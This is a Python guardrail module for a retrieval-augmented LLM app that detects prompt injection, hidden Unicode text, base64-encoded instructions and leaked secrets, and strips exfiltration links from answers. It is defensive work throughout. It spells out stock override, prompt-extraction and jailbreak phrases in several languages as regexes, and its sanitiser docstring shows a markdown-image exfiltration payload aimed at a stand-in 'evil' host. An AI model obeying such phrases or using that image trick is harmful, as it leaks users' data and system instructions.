"""
security.py
------------
Guardrails that need no LLM call (so they are free, fast and cannot
themselves be prompt-injected). Nothing here is a complete defence --
heuristics are bypassable. The real protection is the ARCHITECTURE:
server-side ACL filtering, no tools with side effects, output
sanitising, and treating every retrieved chunk as untrusted data.
This module is the cheap first line plus the audit signal.

Contents
  scan_text()          injection / hidden-text / secret detection for ingest and query time
  check_user_input()   policy gate for the user's question (blocks very little on purpose)
  sanitize_answer()    strips exfiltration channels from the model's output
  RateLimiter          in-memory sliding-window limiter (single process)
"""

import base64
import re
import secrets
import threading
import time
import unicodedata
from collections import defaultdict, deque
from dataclasses import dataclass, asdict

from app.config import MAX_QUESTION_CHARS

# Random per process. It goes into the system prompt with "never output this";
# if it ever shows up in an answer, the system prompt leaked.
SYSTEM_CANARY = "cnry-" + secrets.token_hex(6)

HIGH, MEDIUM = "high", "medium"


@dataclass
class Finding:
    rule: str
    severity: str
    excerpt: str
    location: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


# ---------------------------------------------------------------- text normalisation
_ZERO_WIDTH = dict.fromkeys(map(ord, "\u200b\u200c\u200d\u200e\u200f\u2060\ufeff\u00ad"), None)
_BIDI = re.compile("[\u202a-\u202e\u2066-\u2069]")
_TAG_CHARS = re.compile("[\U000e0000-\U000e007f]")        # "ASCII smuggling": invisible chars that encode ASCII
# Look-alike letters (Cyrillic/Greek) that attackers swap in to dodge keyword filters. Applied AFTER lower-casing.
_CONFUSABLES = str.maketrans({
    "а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "х": "x", "у": "y", "і": "i", "ј": "j", "ѕ": "s", "ԁ": "d",
    "ɡ": "g", "ᴏ": "o", "ο": "o", "ν": "v", "α": "a", "ε": "e", "ι": "i", "ρ": "p", "τ": "t", "κ": "k", "μ": "m",
})
_LEET = str.maketrans({"0": "o", "1": "i", "3": "e", "4": "a", "5": "s", "7": "t", "@": "a", "$": "s"})
_SPACED_LETTERS = re.compile(r"\b(?:[a-z] ){3,}[a-z]\b")


def _decode_tag_chars(text: str) -> str:
    return "".join(chr(ord(c) - 0xE0000) for c in text if 0xE0020 <= ord(c) <= 0xE007E)


def _normalise(text: str) -> str:
    text = unicodedata.normalize("NFKC", text).translate(_ZERO_WIDTH).lower().translate(_CONFUSABLES)
    return re.sub(r"\s+", " ", text)


def _variants(norm: str) -> list[str]:
    """The same text as the attacker might have disguised it: as-is, with leetspeak undone, with
    's p a c e d' letters joined. Rules run on every variant."""
    out = [norm]
    deleet = norm.translate(_LEET)
    if deleet != norm:
        out.append(deleet)
    despaced = _SPACED_LETTERS.sub(lambda m: m.group(0).replace(" ", ""), norm)
    if despaced != norm:
        out.append(despaced)
    return out


# ---------------------------------------------------------------- rules
# Building blocks (all matched on lower-cased, normalised text).
_V_IGNORE = (r"(?:ignore|disregard|forget|override|overrule|bypass|neglect|set aside|pay no attention to|do not follow|don't follow|"
             r"stop following|stop obeying|do not obey|don't obey|do not heed|don't heed)")
_QUAL = (r"(?:previous|prior|above|earlier|preceding|foregoing|former|original|initial|existing|system|developer|safety|your|"
         r"all your|everything you)")
_NOUN = (r"(?:instructions?|prompts?|rules|messages?|guidelines?|directions?|directives?|guidance|constraints|commands|"
         r"restrictions|programming|training)")
_V_REVEAL = r"(?:reveal|show|print|output|repeat|display|leak|quote|recite|tell me|give me|disclose|expose|list|write out|dump)"
_SECRET_QUAL = r"(?:your|the system|system|hidden|secret|internal|developer|configured)"
_V_SEND = r"(?:send|post|forward|upload|exfiltrate|transmit|email|e-mail|leak|share|submit|copy|paste)"
_SENSITIVE_OBJ = (r"(?:conversation|chat(?: history)?|history|context|prompt|instructions?|secrets?|passwords?|credentials?|api keys?|"
                  r"tokens?|retrieved (?:text|documents?|content)|everything|(?:the )?(?:whole|entire|full) (?:conversation|document|text)|"
                  r"user'?s? (?:question|data|chat|messages?)|all (?:of )?(?:the )?(?:data|documents?|text|content|information))")
_DEST = r"(?:https?://|[\w.+-]+@[\w-]+\.[\w.-]+|\b\d{1,3}(?:\.\d{1,3}){3}\b)"

_RULES: list[tuple[str, str, re.Pattern]] = [(n, sev, re.compile(p)) for n, sev, p in [
    # --- overriding the assistant's instructions (HIGH)
    ("override_instructions", HIGH, rf"\b{_V_IGNORE}\b[^.;\n]{{0,30}}?\b{_QUAL}\b[^.;\n]{{0,25}}?\b{_NOUN}\b"),
    ("override_instructions", HIGH, rf"\b{_V_IGNORE}\b (?:the |any |all |your |my |these |those )?{_NOUN} (?:you (?:were|have|received|got|had)|given to you|provided to you|above|earlier|previously|before)\b"),
    ("override_instructions", HIGH, r"\b(?:ignore|disregard|forget)\b (?:all )?(?:of )?(?:the )?(?:above|everything above|previous|prior|earlier)\b[,]? ?(?:and instead|instead|and then|and (?:tell|say|print|reveal|output|respond|answer|write|act))\b"),
    ("forget_everything", HIGH, r"\bforget (?:everything|all) (?:that )?(?:you|which you)(?: were| have been|'ve been)? (?:told|taught|instructed|given)\b"),
    ("ignore_above_soft", MEDIUM, r"\b(?:ignore|disregard)\b (?:all )?(?:of )?(?:the )?(?:above|previous|prior|earlier)\b(?: (?:if|when|unless)\b|[.,;]|$)"),
    # --- extracting the hidden prompt (HIGH)
    ("reveal_system_prompt", HIGH, rf"\b{_V_REVEAL}\b[^.;\n]{{0,40}}\b{_SECRET_QUAL}\b[^.;\n]{{0,25}}\b(?:prompts?|instructions?|messages?|configuration|rules|guidelines)\b"),
    ("reveal_system_prompt", HIGH, r"\b(?:what (?:is|are|were)|tell me what|say what)\b[^.;?\n]{0,25}\b(?:your|the system)\b[^.;?\n]{0,15}\b(?:internal|system|hidden|initial|original|secret|developer)?\b ?(?:instructions?|prompts?|messages?|rules|configuration)\b"),
    ("reveal_system_prompt", HIGH, r"\b(?:instructions?|prompts?|rules) you (?:were|have been) (?:given|configured with|told)\b"),
    ("reveal_system_prompt", HIGH, r"\b(?:repeat|print|output|recite|show) the (?:instructions?|text|words?) (?:above|before)\b"),
    ("quote_everything_before", HIGH, r"\b(?:quote|repeat|print|output|recite|copy)\b[^.;\n]{0,25}\beverything (?:written|said|above|before|that came before|in (?:your|the) (?:prompt|context))\b"),
    # --- chat-template / role tokens (HIGH)
    ("chat_template_tokens", HIGH, r"(<\|(?:im_start|im_end|system|assistant|user|endoftext|start_header_id|end_header_id)\|>|\[/?inst\]|<<sys>>|<</sys>>)"),
    # --- hiding things from the user (HIGH / MEDIUM)
    ("conceal_from_user", HIGH, r"\b(?:do not|don't|never) (?:tell|inform|let|reveal (?:this )?to|mention (?:this )?to) (?:the )?user\b(?!'s)"),
    ("conceal_from_user", HIGH, r"\bsecret from (?:the )?user\b"),
    ("conceal_from_user_soft", MEDIUM, r"\bwithout (?:telling|informing|notifying) (?:the )?user\b"),
    # --- sending sensitive things out (HIGH): verb + sensitive object + a destination
    ("exfiltrate_data", HIGH, rf"\b{_V_SEND}\b[^.;\n]{{0,60}}\b{_SENSITIVE_OBJ}\b[^.;\n]{{0,80}}{_DEST}"),
    ("leak_with_new_task", HIGH, r"\byour (?:new|real|actual) (?:task|job|goal)\b[^.\n]{0,80}\b(?:leak|reveal|exfiltrate|dump|expose|disclose|send|steal)\b"),
    # --- other languages (HIGH)
    ("override_es", HIGH, r"\b(?:ignora|ignore|olvida|omite)\w*\b (?:todas |todo )?(?:las |lo )?(?:instrucciones|reglas|indicaciones) (?:anteriores|previas)\b"),
    ("override_fr", HIGH, r"\bignor(?:e|ez|er)\b (?:toutes )?(?:les )?(?:instructions|consignes|directives|r\u00e8gles) (?:pr\u00e9c\u00e9dentes|ant\u00e9rieures|ci-dessus)"),
    ("override_de", HIGH, r"\bignorier\w* (?:alle )?(?:vorherigen|bisherigen|obigen|fr\u00fcheren) (?:anweisungen|instruktionen|regeln)\b"),
    ("override_it", HIGH, r"\bignora (?:tutte )?le (?:istruzioni|regole) (?:precedenti|sopra)\b"),
    ("override_ur", HIGH, r"(?:\u06c1\u062f\u0627\u06cc\u0627\u062a|\u0627\u062d\u06a9\u0627\u0645\u0627\u062a).{0,25}\u0646\u0638\u0631 \u0627\u0646\u062f\u0627\u0632|\u0646\u0638\u0631 \u0627\u0646\u062f\u0627\u0632.{0,25}(?:\u06c1\u062f\u0627\u06cc\u0627\u062a|\u0627\u062d\u06a9\u0627\u0645\u0627\u062a)"),
    ("override_roman_urdu", HIGH, r"\b(?:pichli|pichhli|pehli|pehle|purani)\b.{0,25}\b(?:hidayat|hidayaat|ehkam|ahkam|instructions?)\b.{0,25}\b(?:ignore|nazar andaz|bhool)"),
    ("override_roman_urdu", HIGH, r"\b(?:ignore|nazar andaz|bhool\w*)\b.{0,30}\b(?:hidayat|hidayaat|ehkam|ahkam)\b"),
    # --- persona, authority, model-directed text (MEDIUM: warn, don't block)
    ("persona_hijack", MEDIUM, r"\byou are now (?:a|an|the|in)\b|\bpretend (?:to be|you are)\b|\bact as (?:a|an|if)\b"),
    ("persona_hijack", MEDIUM, r"\byou are now\b[^.;\n]{0,25}\b(?:dan|unrestricted|unfiltered|jailbroken|uncensored|evil|without (?:any )?(?:rules|restrictions|limits))\b|\bfrom (?:this point|now on|here on),? you (?:are|will|must|shall|should)\b"),
    ("authority_claim", MEDIUM, r"\b(?:system|admin(?:istrator)?|root|security) (?:override|directive|authorization)\b|\bauthori[sz]es? (?:the )?disclosure\b"),
    ("authority_claim", MEDIUM, r"\b(?:i am|i'm|as) the (?:administrator|admin|developer|owner|ceo|operator)\b[^.\n]{0,60}\b(?:telling|tell|order|instruct|authori[sz]e|command|direct)\w*"),
    ("authority_claim", MEDIUM, r"\bhigher priority than\b[^.\n]{0,40}\b(?:developer|system|operator|your)\b"),
    ("model_directed_command", MEDIUM, r"\b(?:you must|you will|you should|your new task is|from now on,? you)\b.{0,60}\b(?:respond|answer|reply|say|output|act|pretend|behave)\b"),
    ("model_directed_text", MEDIUM, r"\bnote to (?:the )?(?:ai|assistant|llm|model|chatbot|reviewers?)\b|\b(?:respond|reply|answer) only with\b|\b(?:in|to) every (?:answer|response|reply)\b|\bwhen you read this\b"),
    ("new_instructions_marker", MEDIUM, r"(^| )(?:new|updated|real|actual) instructions?:|(^| )system ?(?:prompt|message)?:"),
    ("conditional_trigger", MEDIUM, r"\b(?:when|if|whenever) (?:asked|someone asks|the user asks|anyone asks|a user asks|you are asked)\b.{0,80}\b(?:say|tell|reply|respond|answer|state)\b"),
    ("remote_markdown_image", MEDIUM, r"!\[[^\]]*\]\(\s*https?://"),
]]

_SECRETS: list[tuple[str, re.Pattern]] = [(n, re.compile(p)) for n, p in [
    ("aws_access_key", r"\bAKIA[0-9A-Z]{16}\b"),
    ("private_key_block", r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----"),
    ("groq_api_key", r"\bgsk_[A-Za-z0-9]{20,}\b"),
    ("openai_style_key", r"\bsk-[A-Za-z0-9_-]{20,}\b"),
    ("github_token", r"\bgh[pousr]_[A-Za-z0-9]{30,}\b"),
    ("slack_token", r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b"),
]]


def _excerpt(text: str, start: int, end: int, pad: int = 40) -> str:
    return re.sub(r"\s+", " ", text[max(0, start - pad): end + pad]).strip()[:160]


_BASE64_BLOB = re.compile(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{24,}={0,2}(?![A-Za-z0-9+/])")


def _try_b64_text(blob: str) -> str:
    """Decoded text if the blob is base64 of mostly-printable text, else ''. (Images/keys decode to binary: ignored.)"""
    try:
        raw = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=True)
        text = raw.decode("utf-8")
    except (ValueError, UnicodeDecodeError):
        return ""
    printable = sum(ch.isprintable() or ch in "\n\t" for ch in text)
    return text if text and printable / len(text) > 0.9 else ""


def scan_text(text: str, location: str = "", check_secrets: bool = True) -> list[Finding]:
    """Returns findings for one block of text (a page / section / chunk)."""
    findings: list[Finding] = []

    # 1) invisible-character tricks
    if _TAG_CHARS.search(text):
        decoded = _decode_tag_chars(text)
        findings.append(Finding("unicode_tag_smuggling", HIGH, f"hidden text: {decoded[:100]!r}", location))
        text = text + " " + decoded                      # also scan what the hidden text says
    n_zw = sum(1 for c in text if c in "\u200b\u200c\u200d\u2060\ufeff")
    if n_zw >= 8:
        findings.append(Finding("zero_width_characters", MEDIUM, f"{n_zw} zero-width chars", location))
    if _BIDI.search(text):
        findings.append(Finding("bidi_override_characters", MEDIUM, "bidirectional override chars", location))

    # 2) instruction-like text. Rules run on the normalised text AND its de-obfuscated variants
    #    (leetspeak undone, s p a c e d letters joined, look-alike letters mapped, zero-width removed)
    norm = _normalise(text)
    seen: set[str] = set()
    for variant in _variants(norm):
        for name, severity, pattern in _RULES:
            if name in seen:
                continue
            m = pattern.search(variant)
            if m:
                seen.add(name)
                findings.append(Finding(name, severity, _excerpt(variant, m.start(), m.end()), location))

    # 2b) instructions hidden inside base64 blobs ("decode and follow: aWdub3Jl...")
    for blob in _BASE64_BLOB.findall(text):
        decoded = _try_b64_text(blob)
        if decoded and any(f.severity == HIGH for f in scan_text(decoded, check_secrets=False)):
            findings.append(Finding("encoded_injection", HIGH, f"base64 decodes to: {decoded[:100]!r}", location))
            break

    # 3) secrets (raw text: they are case-sensitive)
    if check_secrets:
        for name, pattern in _SECRETS:
            m = pattern.search(text)
            if m:
                findings.append(Finding(f"secret:{name}", MEDIUM, name + " (value hidden)", location))
    return findings


def max_severity(findings: list[Finding]) -> str:
    if any(f.severity == HIGH for f in findings):
        return HIGH
    return MEDIUM if findings else "none"


# ---------------------------------------------------------------- user-input policy gate
POLICY_BLOCK_MESSAGE = "I can't help with that request."
_EXTRACTION = re.compile(
    r"\b(reveal|show|print|output|repeat|display|leak|dump|tell me|what (is|are)) (me )?(your|the) "
    r"(system prompt|system message|hidden instructions|initial instructions|internal instructions|canary)"
)
_JAILBREAK = re.compile(r"\b(dan mode|developer mode enabled|jailbreak|do anything now)\b")


def check_user_input(question: str, max_chars: int = 0, block_extraction: bool = True) -> tuple[bool, str, list[Finding]]:
    """Returns (allowed, reason, findings). Deliberately blocks very little:
    a user attacking their own session mostly hurts only themselves, and the
    data they could reach is already limited server-side by their ACL. We BLOCK
    system-prompt extraction (no legitimate use here) and absurd lengths, and
    only FLAG (audit) the rest, so a student asking 'what is prompt injection?'
    is not refused."""
    limit = max_chars or MAX_QUESTION_CHARS
    if len(question) > limit:
        return False, f"question longer than {limit} characters", []
    norm = _normalise(question)
    flags = [f for f in scan_text(question, "question", check_secrets=False)]
    if block_extraction and (_EXTRACTION.search(norm) or any(f.rule in ("reveal_system_prompt", "quote_everything_before") for f in flags)):
        return False, "system prompt extraction attempt", [Finding("reveal_system_prompt", HIGH, norm[:120])]
    if _JAILBREAK.search(norm):
        flags.append(Finding("jailbreak_phrase", MEDIUM, norm[:120]))
    return True, "", flags


# ---------------------------------------------------------------- output sanitising
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_HTML_IMG = re.compile(r"<\s*img\b[^>]*>", re.IGNORECASE)
_URL = re.compile(r"https?://[^\s<>()\[\]\"']+", re.IGNORECASE)
_MD_LINK = re.compile(r"\[([^\]]+)\]\((https?://[^)\s]+)\)")
_UNSAFE_LINK = re.compile(r"\[([^\]]*)\]\(\s*(?:javascript|vbscript|data|mailto|file|ftp|tel)\s*:[^)]*\)", re.IGNORECASE)


def sanitize_answer(answer: str, context_text: str = "") -> tuple[str, list[str]]:
    """Removes ways a poisoned document could smuggle data OUT through the
    rendered answer: images (auto-fetched by the browser, so
    ![](https://evil/?q=SECRET) leaks with no click), links/URLs that did not
    come from the retrieved context, secrets, and the system-prompt canary."""
    actions: list[str] = []

    if SYSTEM_CANARY in answer:
        return POLICY_BLOCK_MESSAGE, ["system prompt leak blocked (canary seen in output)"]

    cleaned = _MD_IMAGE.sub("[image removed]", answer)
    cleaned = _HTML_IMG.sub("[image removed]", cleaned)
    if cleaned != answer:
        actions.append("removed image embed(s)")

    no_unsafe = _UNSAFE_LINK.sub(lambda m: m.group(1), cleaned)
    if no_unsafe != cleaned:
        actions.append("removed link(s) with an unsafe scheme (javascript:, mailto:, data: ...)")
        cleaned = no_unsafe

    allowed = {u.rstrip(".,;:") for u in _URL.findall(context_text)}

    def _fix_link(m: re.Match) -> str:
        return m.group(0) if m.group(2).rstrip(".,;:") in allowed else m.group(1)

    after_links = _MD_LINK.sub(_fix_link, cleaned)
    after_urls = _URL.sub(lambda m: m.group(0) if m.group(0).rstrip(".,;:") in allowed else "[link removed]", after_links)
    if after_urls != cleaned:
        actions.append("removed link(s) not present in the source documents")
    cleaned = after_urls

    for name, pattern in _SECRETS:
        if pattern.search(cleaned):
            cleaned = pattern.sub("[redacted]", cleaned)
            actions.append(f"redacted {name}")
    return cleaned, actions


# ---------------------------------------------------------------- rate limiting
class RateLimiter:
    """Sliding window, in memory. Good enough for one server process; with
    several workers or containers each has its own counts -- move to Redis then."""

    def __init__(self, max_calls: int, window_seconds: int):
        self.max_calls, self.window = max_calls, window_seconds
        self._hits: dict[str, deque] = defaultdict(deque)
        self._lock = threading.Lock()

    def _trim(self, key: str, now: float) -> deque:
        q = self._hits[key]
        while q and now - q[0] > self.window:
            q.popleft()
        return q

    def retry_after(self, key: str) -> int:
        """0 if allowed, else seconds until a slot frees up. Does not count a hit."""
        now = time.time()
        with self._lock:
            q = self._trim(key, now)
            return 0 if len(q) < self.max_calls else int(self.window - (now - q[0])) + 1

    def hit(self, key: str) -> None:
        with self._lock:
            self._trim(key, time.time()).append(time.time())

    def clear(self, key: str) -> None:
        with self._lock:
            self._hits.pop(key, None)

    def reset(self) -> None:
        with self._lock:
            self._hits.clear()